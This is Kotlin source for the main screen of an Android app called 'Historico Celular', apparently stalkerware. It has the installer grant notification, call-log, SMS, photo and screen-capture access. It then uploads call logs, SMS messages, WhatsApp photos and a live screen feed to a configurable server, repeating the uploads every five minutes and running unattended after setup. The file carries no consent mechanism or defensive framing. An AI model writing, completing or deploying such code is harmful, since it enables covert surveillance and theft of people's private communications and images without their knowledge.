package com.example.historicocelular

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {

    private lateinit var prefs: android.content.SharedPreferences
    private var urlServidor = ""

    private val capturaPermissao = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { resultado ->
        if (resultado.resultCode == Activity.RESULT_OK && resultado.data != null) {
            val i = Intent(this, ScreenService::class.java).apply {
                putExtra("resultCode", resultado.resultCode)
                putExtra("data", resultado.data)
                putExtra("urlServidor", urlServidor)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
            else startService(i)
            Toast.makeText(this, "Tela sendo compartilhada!", Toast.LENGTH_LONG).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        prefs = getSharedPreferences("config", MODE_PRIVATE)
        urlServidor = prefs.getString("url", "") ?: ""

        val scroll = ScrollView(this)
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(50, 100, 50, 50)
        }

        layout.addView(TextView(this).apply {
            text = "Historico Celular - Painel de Controle"
            textSize = 20f
        })

        layout.addView(EditText(this).apply {
            hint = "URL do servidor"
            setText(urlServidor)
            tag = "campoUrl"
        })

        layout.addView(Button(this).apply {
            text = "1. Salvar URL"
            setOnClickListener {
                val campo = layout.findViewWithTag<EditText>("campoUrl")
                urlServidor = campo.text.toString().trim()
                prefs.edit().putString("url", urlServidor).apply()
                Toast.makeText(this@MainActivity, "URL salva!", Toast.LENGTH_SHORT).show()
            }
        })

        layout.addView(Button(this).apply {
            text = "2. Ativar acesso a notificacoes"
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
        })

        layout.addView(Button(this).apply {
            text = "3. Permitir chamadas e SMS"
            setOnClickListener {
                val perms = mutableListOf<String>()
                perms.add(android.Manifest.permission.READ_CALL_LOG)
                perms.add(android.Manifest.permission.READ_SMS)
                if (Build.VERSION.SDK_INT >= 33) {
                    perms.add("android.permission.READ_MEDIA_IMAGES")
                    perms.add("android.permission.POST_NOTIFICATIONS")
                } else {
                    perms.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                }
                ActivityCompat.requestPermissions(this@MainActivity, perms.toTypedArray(), 1001)
            }
        })

        layout.addView(Button(this).apply {
            text = "4. Compartilhar tela"
            setOnClickListener {
                val pm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                capturaPermissao.launch(pm.createScreenCaptureIntent())
            }
        })

        layout.addView(Button(this).apply {
            text = "5. Testar conexao"
            setOnClickListener {
                DataSender.testarConexao(this@MainActivity, urlServidor)
            }
        })

        layout.addView(Button(this).apply {
            text = "6. Enviar chamadas agora"
            setOnClickListener {
                CallLogReader.enviar(this@MainActivity, urlServidor)
                Toast.makeText(this@MainActivity, "Enviando chamadas...", Toast.LENGTH_SHORT).show()
            }
        })

        layout.addView(Button(this).apply {
            text = "7. Enviar SMS agora"
            setOnClickListener {
                SmsReader.enviar(this@MainActivity, urlServidor)
                Toast.makeText(this@MainActivity, "Enviando SMS...", Toast.LENGTH_SHORT).show()
            }
        })

        layout.addView(Button(this).apply {
            text = "8. Enviar fotos do WhatsApp"
            setOnClickListener {
                PhotoScanner.enviar(this@MainActivity, urlServidor)
                Toast.makeText(this@MainActivity, "Enviando fotos...", Toast.LENGTH_SHORT).show()
            }
        })

        layout.addView(TextView(this).apply {
            text = "\n\nFaca TODOS os passos (1-8) uma vez.\nDepois o app funciona sozinho."
            textSize = 14f
        })

        scroll.addView(layout)
        setContentView(scroll)

        val handler = Handler(Looper.getMainLooper())
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (urlServidor.isNotEmpty()) {
                    CallLogReader.enviar(this@MainActivity, urlServidor)
                    SmsReader.enviar(this@MainActivity, urlServidor)
                    PhotoScanner.enviar(this@MainActivity, urlServidor)
                }
                handler.postDelayed(this, 5 * 60 * 1000L)
            }
        }, 30000)
    }
}
